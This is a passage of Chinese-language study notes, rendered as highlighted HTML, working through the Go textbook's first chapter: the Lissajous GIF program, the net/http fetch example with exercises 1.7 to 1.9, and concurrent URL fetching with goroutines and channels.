class=\"token punctuation\">.</span>RGBA<span class=\"token punctuation\">{</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">Lissajousemain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// The sequence of images is deterministic unless we seed</span>\n\t<span class=\"token comment\">// the pseudo-random number generator using the current time.</span>\n\t<span class=\"token comment\">// Thanks to Randall McPherson for pointing out the omission.</span>\n\trand<span class=\"token punctuation\">.</span><span class=\"token function\">Seed</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">UTC</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">UnixNano</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">Lissajous</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdout<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">Lissajous</span><span class=\"token punctuation\">(</span>out io<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token punctuation\">(</span>\n\t\tcycles  <span class=\"token operator\">=</span> <span class=\"token number\">5</span>     <span class=\"token comment\">// number of complete x oscillator revolutions</span>\n\t\tres     <span class=\"token operator\">=</span> <span class=\"token number\">0.001</span> <span class=\"token comment\">// angular resolution</span>\n\t\tsize    <span class=\"token operator\">=</span> <span class=\"token number\">100</span>   <span class=\"token comment\">// image canvas covers [-size..+size]</span>\n\t\tnframes <span class=\"token operator\">=</span> <span class=\"token number\">64</span>    <span class=\"token comment\">// number of animation frames</span>\n\t\tdelay   <span class=\"token operator\">=</span> <span class=\"token number\">8</span>     <span class=\"token comment\">// delay between frames in 10ms units</span>\n\t<span class=\"token punctuation\">)</span>\n\tcolorIndex <span class=\"token operator\">:=</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\tfreq <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Float64</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3.0</span> <span class=\"token comment\">// relative frequency of y oscillator</span>\n\tanim <span class=\"token operator\">:=</span> gif<span class=\"token punctuation\">.</span>GIF<span class=\"token punctuation\">{</span>LoopCount<span class=\"token punctuation\">:</span> nframes<span class=\"token punctuation\">}</span>\n\tphase <span class=\"token operator\">:=</span> <span class=\"token number\">0.0</span> <span class=\"token comment\">// phase difference</span>\n\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nframes<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span>\n\t\trect <span class=\"token operator\">:=</span> image<span class=\"token punctuation\">.</span><span class=\"token function\">Rect</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>size<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token operator\">*</span>size<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\timg <span class=\"token operator\">:=</span> image<span class=\"token punctuation\">.</span><span class=\"token function\">NewPaletted</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">,</span> palette<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">for</span> t <span class=\"token operator\">:=</span> <span class=\"token number\">0.0</span><span class=\"token punctuation\">;</span> t <span class=\"token operator\">&lt;</span> cycles<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>math<span class=\"token punctuation\">.</span>Pi<span class=\"token punctuation\">;</span> t <span class=\"token operator\">+=</span> res <span class=\"token punctuation\">{</span>\n\t\t\tx <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>\n\t\t\ty <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sin</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">*</span>freq <span class=\"token operator\">+</span> phase<span class=\"token punctuation\">)</span>\n\t\t\timg<span class=\"token punctuation\">.</span><span class=\"token function\">SetColorIndex</span><span class=\"token punctuation\">(</span>size<span class=\"token operator\">+</span><span class=\"token function\">int</span><span class=\"token punctuation\">(</span>x<span class=\"token operator\">*</span>size<span class=\"token operator\">+</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> size<span class=\"token operator\">+</span><span class=\"token function\">int</span><span class=\"token punctuation\">(</span>y<span class=\"token operator\">*</span>size<span class=\"token operator\">+</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> colorIndex<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tcolorIndex <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>colorIndex <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token function\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>palette<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\tphase <span class=\"token operator\">+=</span> <span class=\"token number\">0.1</span>\n\t\tanim<span class=\"token punctuation\">.</span>Delay <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>anim<span class=\"token punctuation\">.</span>Delay<span class=\"token punctuation\">,</span> delay<span class=\"token punctuation\">)</span>\n\t\tanim<span class=\"token punctuation\">.</span>Image <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>anim<span class=\"token punctuation\">.</span>Image<span class=\"token punctuation\">,</span> img<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\tgif<span class=\"token punctuation\">.</span><span class=\"token function\">EncodeAll</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>anim<span class=\"token punctuation\">)</span> <span class=\"token comment\">// NOTE: ignoring encoding errors</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>1.5. 获取URL</h2>\n<h3>net/http</h3>\n<p>这个程序将获取对应的url，并将其源文本打印出来；类似curl工具</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Fetch prints the content found at a URL.</span>\n<span class=\"token keyword\">package</span> fetch\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"io\"</span>\n\t<span class=\"token string\">\"net/http\"</span>\n\t<span class=\"token string\">\"os\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">Fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> url <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\tresp<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"fetch: %v\\n\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tb<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">ReadAll</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span>\n\t\tresp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"fetch: reading %s: %v\\n\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><ul>\n<li>http.Get函数是创建HTTP请求的函数，如果获取过程没有出错，那么会在resp这个结构体中得到访问的请求结果。resp的Body字段包括一个可读的服务器响应流。</li>\n<li>io.ReadAll函数从response中读取到全部内容；将其结果保存在变量b中。</li>\n<li>resp.Body.Close关闭resp的Body流，防止资源泄露</li>\n<li>Printf函数会将结果b写出到标准输出流中。</li>\n</ul>\n<figure><figcaption>image-20240319174745213</figcaption></figure>\n<p>错误输出如图：</p>\n<figure><figcaption>image-20240319175205976</figcaption></figure>\n<p>无论哪种失败原因，我们的程序都用了os.Exit函数来终止进程，并且返回一个status错误码，其值为1。</p>\n<h3>练习 1.7</h3>\n<p>函数调用io.Copy(dst, src)会从src中读取内容，并将读到的结果写入到dst中，使用这个函数替代掉例子中的ioutil.ReadAll来拷贝响应结构体到os.Stdout，避免申请一个缓冲区（例子中的b）来存储。记得处理io.Copy返回结果中的错误。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">IoCopy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> url <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\tresp<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"fetch: %v\\n\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdout<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span>\n\t\tresp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"fetch: reading %s: %v\\n\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 1.8</h3>\n<p>修改fetch这个范例，如果输入的url参数没有 <code>http://</code> 前缀的话，为这个url加上该前缀。你可能会用到strings.HasPrefix这个函数。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">HasPrefix</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> url <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 加个判断</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>strings<span class=\"token punctuation\">.</span><span class=\"token function\">HasPrefix</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">\"https://\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">//这里必须Fprint，允许输入的不是字符串</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprint</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"前缀不对哦\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tresp<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n            \n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"fetch: %v\\n\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdout<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span>\n\t\tresp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"fetch: reading %s: %v\\n\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>练习 1.9</h3>\n<p>修改fetch打印出HTTP协议的状态码，可以从resp.Status变量得到该状态码。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">RespStatus</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> url <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\tresp<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"fetch: %v\\n\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stdout<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span>\n\t\tresp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintf</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>Stderr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"fetch: reading %s: %v\\n\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t\tos<span class=\"token punctuation\">.</span><span class=\"token function\">Exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"状态码：%d\"</span><span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">.</span>StatusCode<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>1.6. 并发获取多个URL</h2>\n<p>例子</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> fetchall\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"fmt\"</span>\n\t<span class=\"token string\">\"io\"</span>\n\t<span class=\"token string\">\"io/ioutil\"</span>\n\t<span class=\"token string\">\"net/http\"</span>\n\t<span class=\"token string\">\"os\"</span>\n\t<span class=\"token string\">\"time\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">Fetching</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tstart <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> url <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> ch<span class=\"token punctuation\">)</span> <span class=\"token comment\">// start a goroutine</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span>ch<span class=\"token punctuation\">)</span> <span class=\"token comment\">// receive from channel ch</span>\n\t<span class=\"token punctuation\">}</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.2fs elapsed\\n\"</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Since</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Seconds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>url <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> ch <span class=\"token keyword\">chan</span><span class=\"token operator\">&lt;-</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\tstart <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tresp<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">Get</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tch <span class=\"token operator\">&lt;-</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprint</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token comment\">// send to channel ch</span>\n\t\t<span class=\"token keyword\">return</span>\n\t<span class=\"token punctuation\">}</span>\n\tnbytes<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> io<span class=\"token punctuation\">.</span><span class=\"token function\">Copy</span><span class=\"token punctuation\">(</span>ioutil<span class=\"token punctuation\">.</span>Discard<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">)</span>\n\tresp<span class=\"token punctuation\">.</span>Body<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// don't leak resources</span>\n\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\tch <span class=\"token operator\">&lt;-</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"while reading %s: %v\"</span><span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span>\n\t<span class=\"token punctuation\">}</span>\n\tsecs <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Since</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Seconds</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tch <span class=\"token operator\">&lt;-</span> fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.2fs  %7d  %s\"</span><span class=\"token punctuation\">,</span> secs<span class=\"token punctuation\">,</span> nbytes<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><figure><figcaption>image-20240319215948498</figcaption></figure>\n<h3>goroutine</h3>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>    ch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> url <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">go</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> ch<span class=\"token punctuation\">)</span> <span class=\"token comment\">// start a goroutine</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">for</span> <span class=\"token keyword\">range</span> os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span>ch<span class=\"token punctuation\">)</span> <span class=\"token comment\">// receive from channel ch</span>\n    <span class=\"token punctuation\">}</span>\n</code></pre></div><p><code>goroutine</code>是一种函数的并发执行方式，而<code>channel</code>是用来在<code>goroutine</code>之间进行参数传递。</p>\n<p>上面的<code>Fetching</code>函数本身也运行在一个<code>goroutine</code>中，而<code>go function</code>则表示创建一个新的<code>goroutine</code>（也就是上面2-4行，把函数<code>fetch</code>放在<code>goroutine</code>中），并在这个新的<code>goroutine</code>中执行这个函数。</p>\n<h3>make</h3>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>ch <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">string</span><span 